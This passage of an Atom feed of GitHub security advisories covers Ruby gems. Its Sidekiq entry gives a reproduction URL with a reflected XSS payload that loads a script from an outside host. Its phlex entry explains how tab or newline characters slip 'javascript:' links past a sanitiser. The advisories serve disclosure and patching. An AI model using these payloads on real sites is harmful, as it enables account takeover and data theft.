<li><a href="https://github.com/sidekiq/sidekiq/blob/main/Changes.md#708">https://github.com/sidekiq/sidekiq/blob/main/Changes.md#708</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2023-1892.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2023-1892.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-h3r8-h5qw-4r35">https://github.com/advisories/GHSA-h3r8-h5qw-4r35</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h3r8-h5qw-4r35</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-04-21T06:30:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sidekiq] Sidekiq vulnerable to a Reflected XSS in Queues Web Page]]></title>
        <id>https://github.com/advisories/GHSA-q655-3pj8-9fxq</id>
        <link href="https://github.com/advisories/GHSA-q655-3pj8-9fxq"/>
        <updated>2024-05-01T13:02:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description:</h3>
<p>During the source Code Review of the metrics.erb view of the Sidekiq Web UI, A reflected XSS vulnerability is discovered. The value of substr parameter is reflected in the response without any encoding, allowing an attacker to inject Javascript code into the response of the application. </p>
<p>This vulnerability can be exploited to target the users of the application, and users of other applications deployed on the same domain or website as that of the Sidekiq website. Successful exploit results may result in compromise of user accounts and user data.</p>
<h3 id="impact">Impact:</h3>
<p>The impact of this vulnerability can be severe. An attacker could exploit it to target users of the Sidekiq Web UI. Moreover, if other applications are deployed on the same domain or website as Sidekiq, users of those applications could also be affected, leading to a broader scope of compromise. Potentially compromising their accounts, forcing the users to perform sensitive actions, stealing sensitive data, performing CORS attacks, defacement of the web application, etc.</p>
<h3 id="mitigation">Mitigation:</h3>
<p>Encode all output data before rendering it in the response to prevent XSS attacks.</p>
<h3 id="steps-to-reproduce">Steps to Reproduce:</h3>
<ol>
<li>Go to the following URL of the sidekiq Web UI: 
https://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22<a href="https://cheemahq.vercel.app/a.js%22%20/%3E">https://cheemahq.vercel.app/a.js%22%20/%3E</a></li>
<li>XSS payload will be executed, causing a popup.</li>
</ol>
<h3 id="evidence">Evidence:</h3>
<p><img alt="image" src="https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e">
Figure 1: Source Code Vulnerable to XSS</p>
<p><img alt="image" src="https://github.com/sidekiq/sidekiq/assets/59286712/7a801feb-d495-416e-8e0e-36dee0eadf85">
Figure 2: XSS payload triggered</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq">https://github.com/sidekiq/sidekiq/security/advisories/GHSA-q655-3pj8-9fxq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32887">https://nvd.nist.gov/vuln/detail/CVE-2024-32887</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d">https://github.com/sidekiq/sidekiq/commit/30786e082c70349ab27ffa9eccc42fb0c696164d</a></li>
<li><a href="https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4">https://github.com/sidekiq/sidekiq/releases/tag/v7.2.4</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2024-32887.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/sidekiq/CVE-2024-32887.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-q655-3pj8-9fxq">https://github.com/advisories/GHSA-q655-3pj8-9fxq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q655-3pj8-9fxq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-26T22:19:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phlex] Cross-site Scripting (XSS) possible due to improper sanitisation of `href` attributes on `<a>` tags]]></title>
        <id>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</id>
        <link href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c"/>
        <updated>2024-04-19T21:44:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>There is a potential cross-site scripting (XSS) vulnerability that can be exploited via maliciously crafted user data.</p>
<p>Our filter to detect and prevent the use of the <code>javascript:</code> URL scheme in the <code>href</code> attribute of an <code>&lt;a&gt;</code> tag could be bypassed with tab <code>\t</code> or newline <code>\n</code> characters between the characters of the protocol, e.g. <code>java\tscript:</code>.</p>
<h3 id="impact">Impact</h3>
<p>If you render an <code>&lt;a&gt;</code> tag with an <code>href</code> attribute set to a user-provided link, that link could potentially execute JavaScript when clicked by another user.</p>
<pre><code class="language-ruby">a(href: user_profile) { "Profile" }
</code></pre>
<h3 id="mitigation">Mitigation</h3>
<p>The best way to mitigate this vulnerability is to update to one of the following versions:</p>
<ul>
<li><a href="https://rubygems.org/gems/phlex/versions/1.10.1">1.10.1</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.9.2">1.9.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.8.3">1.8.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.7.2">1.7.2</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.6.3">1.6.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.5.3">1.5.3</a></li>
<li><a href="https://rubygems.org/gems/phlex/versions/1.4.2">1.4.2</a></li>
</ul>
<h3 id="workarounds">Workarounds</h3>
<p>Configuring a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">Content Security Policy</a> that does not allow <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline"><code>unsafe-inline</code></a> would effectively prevent this vulnerability from being exploited.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/phlex-ruby/phlex/security/advisories/GHSA-g7xq-xv8c-h98c</a></li>
<li><a href="https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb">https://github.com/phlex-ruby/phlex/commit/9e3f5b980655817993682e409cbda72956d865cb</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-32463">https://nvd.nist.gov/vuln/detail/CVE-2024-32463</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy#unsafe-inline</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/phlex/CVE-2024-32463.yml</a></li>
<li><a href="https://github.com/advisories/GHSA-g7xq-xv8c-h98c">https://github.com/advisories/GHSA-g7xq-xv8c-h98c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g7xq-xv8c-h98c</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-17T00:20:23.000Z</published>
    </entry>
</feed>